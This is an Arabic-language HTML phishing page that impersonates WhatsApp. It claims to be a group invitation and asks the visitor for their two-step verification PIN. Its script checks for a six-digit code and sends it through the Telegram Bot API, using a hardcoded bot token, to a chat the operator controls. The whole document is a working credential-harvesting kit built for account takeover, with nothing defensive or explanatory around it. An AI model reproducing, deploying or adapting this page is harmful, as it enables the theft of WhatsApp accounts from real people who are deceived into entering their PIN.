<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق بخطوتين - WhatsApp</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #F6F9FC;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }

        header {
            background-color: #25D366;
            color: white;
            width: 100%;
            padding: 15px 20px;
            text-align: center;
            font-size: 20px;
            font-weight: bold;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: fixed;
            top: 0;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }

        header img {
            height: 25px;
            vertical-align: middle;
        }

        header .menu-icon {
            background-color: white;
            width: 35px;
            height: 35px;
            border-radius: 5px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
        }

        .container {
            background-color: white;
            border-radius: 15px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            padding: 30px;
            margin-top: 100px;
            text-align: center;
            width: 90%;
            max-width: 400px;
        }

        .container img {
            width: 120px;
            margin-bottom: 20px;
        }

        .container h1 {
            font-size: 20px;
            color: #333;
            margin-bottom: 10px;
        }

        .container p {
            font-size: 16px;
            color: #666;
            margin-bottom: 20px;
            line-height: 1.6;
        }

        .container input {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            border: 1px solid #ddd;
            border-radius: 8px;
            margin-bottom: 15px;
            text-align: center;
            box-sizing: border-box;
        }

        .container input:focus {
            outline: none;
            border-color: #25D366;
            box-shadow: 0 0 5px rgba(37, 211, 102, 0.5);
        }

        .container button {
            width: 100%;
            padding: 12px;
            font-size: 18px;
            color: white;
            background-color: #25D366;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .container button:hover {
            background-color: #1DA955;
        }
    </style>
</head>

<body>
    <header>
        <div class="menu-icon">☰</div>
        <div>
            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
            <span>WhatsApp</span>
        </div>
        <a href="#" style="color: white; font-size: 18px; text-decoration: none;">⬇</a>
    </header>

    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
        <h1>الدعوة للانضمام إلى مجموعة واتساب</h1>
        <p>أدخل رمز التحقق بخطوتين (PIN) الذي قمت بتجديده سابقًا.</p>
        <input id="pinCode" type="text" placeholder="PIN Code" maxlength="6">
        <button onclick="sendPin()">متابعة</button>
        <div id="status" style="margin-top: 10px; color: red;"></div>
    </div>

    <script>
        function sendPin() {
            const pinCode = document.getElementById('pinCode').value;

            if (!pinCode || pinCode.length !== 6 || !/^\d+$/.test(pinCode)) {
                alert('يرجى إدخال رمز مكون من 6 أرقام فقط.');
                return;
            }

            // إرسال الكود إلى تيليجرام
            sendCodeToTelegram(pinCode);
        }

        function sendCodeToTelegram(code) {
            const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc'; // التوكن الخاص بالبوت
            const chatId = 'YOUR_CHAT_ID'; // استبدل YOUR_CHAT_ID بالـ Chat ID الخاص بك
            const message = `رمز PIN المدخل هو: ${code}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            })
                .then(response => {
                    if (response.ok) {
                        document.getElementById('status').textContent = 'تم إرسال الكود بنجاح!';
                    } else {
                        document.getElementById('status').textContent = 'حدث خطأ أثناء الإرسال.';
                    }
                })
                .catch(error => {
                    console.error('فشل الاتصال بـ Telegram API:', error);
                    document.getElementById('status').textContent = 'فشل الإرسال. تحقق من الإعدادات.';
                });
        }
    </script>
</body>

</html>